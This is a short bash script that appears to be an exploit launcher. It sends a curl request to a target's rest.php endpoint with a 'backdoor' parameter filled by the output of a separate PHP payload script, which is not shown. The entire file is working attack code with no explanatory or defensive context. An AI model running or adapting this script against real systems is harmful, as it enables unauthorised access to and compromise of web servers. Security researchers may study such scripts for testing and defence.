#!/bin/bash
curl "$1/rest.php/?backdoor=$(php payload2.php)"
